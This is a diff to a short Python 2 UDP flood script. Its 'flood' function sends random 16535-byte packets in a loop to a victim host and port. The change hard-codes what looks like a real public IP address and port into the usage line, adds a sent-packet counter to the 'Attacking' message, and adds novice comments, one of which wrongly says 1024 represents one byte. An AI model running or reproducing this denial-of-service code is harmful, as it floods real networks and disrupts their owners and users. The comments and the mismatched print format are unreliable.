@@ -4,12 +4,15 @@ import random
 import sys
 
 def usage():
-    print "Command: " + sys.argv[0] + " <ip> <port> <packet>"
+    print "Command: " + sys.argv[0] + " <3.235.171.149> <7777> <9999999>"
 
 def flood(victim, vport, duration):
+    # okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    # 1024 representes one byte to the server
     bytes = random._urandom(16535)
     timeout =  time.time() + duration
+    sent = 1
 
     while 1:
         if time.time() > timeout:
@@ -17,7 +20,8 @@ def flood(victim, vport, duration):
         else:
             pass
         client.sendto(bytes, (victim, vport))
-        print "Attacking %s sent packages %s at the port %s "%(victim, vport)
+        sent = sent + 1
+        print "Attacking %s sent packages %s at the port %s "%(sent, victim, vport)
 
 def main():
     print len(sys.argv)
